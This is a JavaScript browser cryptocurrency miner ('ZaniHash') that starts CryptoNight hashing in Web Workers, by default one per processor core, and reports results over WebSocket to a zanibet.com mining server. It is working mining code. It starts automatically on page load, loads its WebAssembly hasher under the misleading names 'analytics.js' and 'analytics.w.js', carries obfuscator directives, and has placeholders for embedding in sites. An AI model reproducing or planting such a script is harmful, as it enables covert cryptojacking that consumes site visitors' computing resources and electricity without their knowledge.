var server = "wss://zhash.zanibet.com:5141/";
var zaniHashJS;

var job = null;
var workers = [];
var ws;
var enableStack = false;

var receiveStack = [];
var sendStack = [];
var totalhashes = 0;
var connected = 0;
var reconnector = 0;
var attempts = 1;
var reportMod = 10;

var throttleMiner = 10;
var handshake = null;
var isPlug = "%isPlug%";

function addWorkers(numThreads) {
  var logicalProcessors = numThreads;

  if (numThreads == -1) {
    try {
      logicalProcessors = window.navigator.hardwareConcurrency;
    } catch (err) {
      logicalProcessors = 4;
    }

    if (!((logicalProcessors > 0) && (logicalProcessors < 40)))
    logicalProcessors = 4;
  }

  if (throttleMiner == 95) {
    throttleMiner = 5;
    logicalProcessors = 1;
    if (isPlug === 'true'){
      try {
        logicalProcessors = parseInt(window.navigator.hardwareConcurrency/2)+1;
        if (logicalProcessors == null || logicalProcessors < 2) logicalProcessors = 3;
      } catch (err) {
        logicalProcessors = 3;
      }
      throttleMiner = 15;
    }
  }

  while (logicalProcessors-- > 0) addWorker();
}

var openWebSocket = function () {

  if (ws != null) {
    ws.close();
  }

  ws = new WebSocket(server);

  ws.onmessage = on_servermsg;
  ws.onerror = function (event) {
    if (connected < 2) connected = 2;
    job = null;
    if (zaniHashJS != null) zaniHashJS.error(event);
  }
  ws.onclose = function () {
    if (connected < 2) connected = 2;
    job = null;
    if (zaniHashJS != null) zaniHashJS.close();
  }
  ws.onopen = function () {
    ws.send((JSON.stringify(handshake)));
    attempts = 1;
    connected = 1;
    if (zaniHashJS != null) zaniHashJS.open();
  }
};

reconnector = function () {
  if (connected !== 3 && (ws == null || (ws.readyState !== 0 && ws.readyState !== 1))) {
    attempts++;
    openWebSocket();
  }

  if (connected !== 3)
  setTimeout(reconnector, 10000 * attempts);
};

function startZaniHash(userid) {
  if (userid == "Unset")return;
  stopZaniHash();
  connected = 0;

  handshake = {
    identifier: "handshake",
    userid: userid,
    version : 5
  };

  addWorkers(-1);
  reconnector();
}

function stopZaniHash() {
  connected = 3;

  if (ws != null) ws.close();
  deleteAllWorkers();
  job = null;
}

function addWorker() {
  // javascript-obfuscator:disable
  var blobURL = URL.createObjectURL( new Blob([ '(',
  function(){
    // javascript-obfuscator:enable
    try {
      if (typeof WebAssembly === "object" && typeof WebAssembly.instantiate === "function") {
        var module = new WebAssembly.Module(Uint8Array.of(0x0, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00));
        if (module instanceof WebAssembly.Module){
          if( 'function' === typeof importScripts) importScripts('%devoliosMiner_domain%/analytics.js');
        } else {
          if( 'function' === typeof importScripts) importScripts('%devoliosMiner_domain%/analytics.w.js');
        }
      } else {
        if( 'function' === typeof importScripts) importScripts('%devoliosMiner_domain%/analytics.w.js');
      }
    } catch (e) {
      if( 'function' === typeof importScripts) importScripts('%devoliosMiner_domain%/analytics.w.js');
    }

    var cn = Module.cwrap('hash_cn', 'string', ['string', 'string', 'number', 'number']);

    function zeroPad(num, places) {
      var zero = places - num.toString().length + 1;
      return Array(+(zero > 0 && zero)).join("0") + num;
    }

    function hex2int(s) {
      return parseInt(s.match(/[a-fA-F0-9]{2}/g).reverse().join(''), 16);
    }

    function int2hex(i) {
      return (zeroPad(i.toString(16), 8)).match(/[a-fA-F0-9]{2}/g).reverse().join('');
    }

    function getRandomInt(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    onmessage = function (e) {
      var jbthrt = e.data;
      var job = jbthrt.job;
      var thrt = jbthrt.throttle;

      var bsuccess = false;
      var hash = "";
      var hexnonce = 0;

      var calcHash = function () {
        if (job !== null) {
          var target = hex2int(job.target);
          var inonce = getRandomInt(0, 0xFFFFFFFF);
          hexnonce = int2hex(inonce);
          try {
            if(job.algo === "cn")
            hash = cn(job.blob, hexnonce, 0, job.variant);
            else if(job.algo === "cn-lite")
            hash = cn(job.blob, hexnonce, 1, job.variant);
            else throw "-";
            var hashval = hex2int(hash.substring(56, 64));
            bsuccess = hashval < target;
          }
          catch (err) {
          }
        }
      };

      var submit = function () {
        if (bsuccess) {
          var msg = {
            identifier: "solved",
            job_id: job.job_id,
            nonce: hexnonce,
            result: hash
          };
          postMessage(JSON.stringify(msg));
        } else {
          postMessage("nothing");
        }
      };

      if (thrt === 0) { calcHash(); submit(); }
      else {
        var t0 = performance.now();
        calcHash();
        var dt = performance.now() - t0;

        var sleept = Math.round(thrt / (100 - thrt + 10) * dt);
        setTimeout(submit, sleept);
      }
    };
    // javascript-obfuscator:disable
  }.toString(),
  ')()' ], { type: 'application/javascript' } ) );
  // javascript-obfuscator:enable

  var newWorker = new Worker(blobURL);
  workers.push(newWorker);

  newWorker.onmessage = on_workermsg;

  setTimeout(function () {
    informWorker(newWorker);
  }, 2000);
}


function removeWorker() {
  if (workers.length < 1) return;
  var wrk = workers.shift();
  wrk.terminate();
}


function deleteAllWorkers() {
  for (i = 0; i < workers.length; i++) {
    workers[i].terminate();
  }
  workers = [];
}

function informWorker(wrk) {
  var evt = {
    data: "wakeup",
    target: wrk
  };
  on_workermsg(evt);
}

function on_servermsg(e) {
  var obj = JSON.parse(e.data);

  if (enableStack) receiveStack.push(obj);

  if (obj.identifier == "job") job = obj;
}

function on_workermsg(e) {
  //console.log("Power :", throttleMiner);
  if (zaniHashJS != null && (totalhashes % reportMod) == 0){
    setThrottleMiner(parseInt(zaniHashJS.getPower()));
  }

  var wrk = e.target;

  if (connected != 1) {
    setTimeout(function () {
      informWorker(wrk);
    }, 2000);
    return;
  }

  if ((e.data) != "nothing" && (e.data) != "wakeup") {
    var obj = JSON.parse(e.data);
    ws.send(e.data);
    if (enableStack) sendStack.push(obj);
  }

  if (job === null) {
    setTimeout(function () {
      informWorker(wrk);
    }, 2000);
    return;
  }

  var jbthrt = {
    job: job,
    throttle: Math.max(0, Math.min(throttleMiner, 100))
  };
  wrk.postMessage(jbthrt);

  if ((e.data) != "wakeup"){
    totalhashes += 1;
    if ((totalhashes % reportMod) == 0) console.log(totalhashes);

    if (zaniHashJS != null){
      if ((totalhashes % reportMod) == 0) {
        zaniHashJS.setHashRate(totalhashes);
      }
    }
  }
}

function setThrottleMiner(power){
  throttleMiner = power;
}

setThrottleMiner(parseInt("%power%"));
startZaniHash("%userId%");
